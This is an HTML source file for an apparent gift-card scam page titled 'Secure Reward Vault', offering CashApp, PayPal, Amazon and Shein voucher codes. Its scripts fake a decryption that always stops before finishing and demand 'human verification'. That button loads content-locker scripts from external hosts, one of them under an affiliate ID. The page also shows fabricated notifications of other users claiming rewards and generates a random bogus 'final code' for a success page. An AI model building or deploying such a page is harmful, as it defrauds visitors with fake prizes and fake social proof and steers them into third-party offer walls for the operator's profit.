<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Reward Vault - 2026 Distribution</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" type="image/x-icon">
    
    <!-- LIBRARY -->
    <script src="/config.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    
    <!-- HYBRID LOCKER -->
    <script type="text/javascript">
        var urlParams = new URLSearchParams(window.location.search);
        var subID = urlParams.get('s1') || 'Owner';
        var isTeam = (subID !== 'Owner' && typeof teamConfig !== 'undefined' && teamConfig[subID]);
        var lck = false;

        if (isTeam) {
            var script = document.createElement('script');
            script.src = 'https://verify.zhwifi.web.id/cl/js/n661xk'; 
            document.head.appendChild(script);
        } else {
            document.write('<script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1864025"><\/script>');
        }
    </script>

    <style>
        :root { --primary: #00ff88; --dark: #050505; --card: #444; --blur: rgba(255,255,255,0.05); }
        body { margin: 0; font-family: 'Poppins', sans-serif; background: var(--dark); color: #fff; overflow-x: hidden; }
        
        .header { padding: 20px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); position: fixed; top: 0; width: 100%; z-index: 100; }
        .logo { font-size: 18px; font-weight: 800; letter-spacing: 2px; color: var(--primary); text-transform: uppercase; }

        .container { max-width: 600px; margin: 100px auto 50px; padding: 20px; }
        .hero-text { text-align: center; margin-bottom: 40px; }
        .hero-text h1 { font-size: 28px; margin-bottom: 10px; background: linear-gradient(90deg, #fff, #aaa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero-text p { color: #888; font-size: 13px; }

        .vault-grid { display: grid; gap: 15px; }
        .vault-card { 
            background: var(--card); border: 1px solid var(--primary); border-radius: 16px; padding: 20px; 
            display: flex; align-items: center; justify-content: space-between; transition: 0.3s;
        }
        .vault-card:hover { border-color: var(--primary); box-shadow: 0 0 20px rgba(0,255,136,0.1); }
        
        .card-icon img { width: 50px; height: 50px; border-radius: 10px; }
        .card-info { flex: 1; margin-left: 15px; }
        .card-title { font-size: 14px; font-weight: 700; display: block; }
        .card-code { font-family: monospace; color: #666; background: #000; padding: 5px 10px; border-radius: 5px; font-size: 12px; display: inline-block; margin-top: 5px; letter-spacing: 1px; }

        .btn-reveal {
            background: var(--primary); color: #000; border: none; padding: 10px 20px; 
            border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 12px; text-transform: uppercase;
        }

        /* Modal Decrypt */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 999; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-box { background: #1a1a1a; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #333; }
        .decrypt-code { font-family: monospace; font-size: 24px; letter-spacing: 3px; margin: 20px 0; color: var(--primary); }
        .progress { width: 100%; height: 6px; background: #333; border-radius: 10px; overflow: hidden; margin-top: 10px; }
        .bar { height: 100%; background: var(--primary); width: 0%; transition: width 0.1s; }
        
        .btn-verify { width: 100%; padding: 15px; background: var(--primary); color: #000; font-weight: 800; border: none; border-radius: 10px; cursor: pointer; margin-top: 20px; font-size: 16px; display: none; }

        /* Fake Notif */
        .notif { position: fixed; bottom: 20px; left: 20px; background: #444; border: 1px solid #333; padding: 12px; border-radius: 10px; display: flex; align-items: center; gap: 10px; z-index: 200; transform: translateY(100px); transition: 0.5s; }
        .notif img { width: 30px; border-radius: 50%; }
        .notif-text { font-size: 11px; color: #ccc; }
        .notif-text b { color: #fff; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo">VAULT ACCESS 2026</div>
</div>

<div class="container">
    <div class="hero-text">
        <h1>Secure Reward Vault</h1>
        <p>Select a hidden voucher code below to decrypt and claim.</p>
    </div>

    <div class="vault-grid">
        <!-- CashApp -->
        <div class="vault-card">
            <div class="card-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Square_Cash_app_logo.svg/1200px-Square_Cash_app_logo.svg.png"></div>
            <div class="card-info">
                <span class="card-title">$750 CashApp</span>
                <span class="card-code">CSH-****-X92</span>
            </div>
            <button class="btn-reveal" onclick="openDecrypt('CSH', '$750 CashApp')">REVEAL</button>
        </div>

        <!-- PayPal -->
        <div class="vault-card">
            <div class="card-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg"></div>
            <div class="card-info">
                <span class="card-title">$1000 PayPal</span>
                <span class="card-code">PYP-****-B24</span>
            </div>
            <button class="btn-reveal" onclick="openDecrypt('PYP', '$1000 PayPal')">REVEAL</button>
        </div>

        <!-- Amazon -->
        <div class="vault-card">
            <div class="card-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"></div>
            <div class="card-info">
                <span class="card-title">$100 Amazon</span>
                <span class="card-code">AMZ-****-Q10</span>
            </div>
            <button class="btn-reveal" onclick="openDecrypt('AMZ', '$100 Amazon')">REVEAL</button>
        </div>
        
         <!-- Shein -->
        <div class="vault-card">
            <div class="card-icon"><img src="https://img.icons8.com/?size=100&id=YESXzFt7dlYK&format=png&color=000000"></div>
            <div class="card-info">
                <span class="card-title">$500 Shein</span>
                <span class="card-code">SHN-****-L88</span>
            </div>
            <button class="btn-reveal" onclick="openDecrypt('SHN', '$500 Shein')">REVEAL</button>
        </div>
    </div>
</div>

<!-- Decrypt Modal -->
<div class="modal" id="decryptModal">
    <div class="modal-box">
        <h3 style="color:#888; font-size:12px;">DECRYPTING CODE...</h3>
        <div class="decrypt-code" id="codeDisplay">X-X-X-X</div>
        <div class="progress"><div class="bar" id="progressBar"></div></div>
        <p id="statusMsg" style="font-size:11px; color:#666; margin-top:10px;">Connecting to secure server...</p>
        
        <button class="btn-verify" id="btnVerify" onclick="call_locker_smart()">HUMAN VERIFICATION REQUIRED</button>
    </div>
</div>

<!-- Fake Notif -->
<div class="notif" id="fakeNotif">
    <img src="https://cdn-icons-png.flaticon.com/512/1138/1138587.png">
    <div class="notif-text"><b>User291</b> revealed <b>$750 CashApp</b> code</div>
</div>

<script>
    const MY_GAME_ID = "RewardVault";
    let selectedPrefix = "";
    let selectedReward = "";

    function openDecrypt(prefix, name) {
        selectedPrefix = prefix;
        selectedReward = name;
        $("#decryptModal").fadeIn();
        $("#btnVerify").hide();
        
        let progress = 0;
        let iv = setInterval(() => {
            progress += Math.random() * 5;
            if(progress > 90) {
                clearInterval(iv);
                $("#statusMsg").text("Decryption Paused. Verification Needed.");
                $("#statusMsg").css("color", "#ff4444");
                $("#codeDisplay").text(prefix + "-????-????");
                $("#btnVerify").fadeIn();
            }
            $("#progressBar").css("width", progress + "%");
            
            // Efek acak kode
            if(progress < 90) {
                $("#codeDisplay").text(prefix + "-" + Math.random().toString(36).substring(7).toUpperCase());
            }
        }, 100);
    }

    function call_locker_smart() {
        // Simpan data untuk halaman sukses
        sessionStorage.setItem("cpa_reward_name", selectedReward);
        sessionStorage.setItem("cpa_status", "processing");

        // Generate Kode Acak untuk Halaman Sukses
        let randomCode = selectedPrefix + "-" + Math.random().toString(36).substring(2,6).toUpperCase() + "-" + Math.random().toString(36).substring(2,6).toUpperCase();
        sessionStorage.setItem("cpa_final_code", randomCode);

        if (isTeam) {
            if (typeof og_load === 'function') og_load({ subid1: subID, subid2: MY_GAME_ID });
        } else {
            if (typeof call_locker === 'function') call_locker();
        }
    }

    // Fake Notif Logic
    setInterval(() => {
        const names = ["Sarah", "Mike", "Jessica", "David", "Emma"];
        const items = ["$750 CashApp", "$100 Amazon", "$500 Shein"];
        const name = names[Math.floor(Math.random() * names.length)];
        const item = items[Math.floor(Math.random() * items.length)];
        
        $(".notif-text").html(`<b>${name}***</b> revealed <b>${item}</b> code`);
        $("#fakeNotif").css("transform", "translateY(0)");
        
        setTimeout(() => { $("#fakeNotif").css("transform", "translateY(100px)"); }, 4000);
    }, 8000);
</script>

</body>
</html>
